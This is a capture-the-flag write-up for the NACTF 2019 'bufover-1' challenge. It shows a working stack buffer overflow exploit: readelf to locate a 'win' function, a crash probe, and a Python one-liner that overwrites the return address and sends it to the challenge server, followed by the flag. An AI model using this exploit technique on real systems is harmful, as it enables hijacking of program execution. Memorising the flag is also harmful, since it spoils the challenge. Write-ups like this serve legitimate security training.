#### Challenge:

The close cousin of a website for "Question marked as duplicate" - part 2!

Can you redirect code execution and get the flag? `nc shell.2019.nactf.com 31462` [bufover-1.c](./bufover-1.c ":ignore") [bufover-1](./bufover-1 ":ignore")

---

#### Solution:

```bash
readelf -s ./bufover-1 | grep win
#    59: 080491b2   125 FUNC    GLOBAL DEFAULT   13 win
python -c 'print "A"*29' | ./bufover-1
dmesg | tail
#[20082.062348] bufover-1[16409]: segfault at 8040041 ip 0000000008040041 sp 00000000ff9b08e0 error 14 in bufover-1[8048000+3000]
python -c 'import struct; print "A"*28 + struct.pack("<I",0x080491b2 )' | nc shell.2019.nactf.com 31462

```

---

<details><summary>FLAG:</summary>

```
nactf{pwn_31p_0n_r3t_iNylg281}
```

</details>
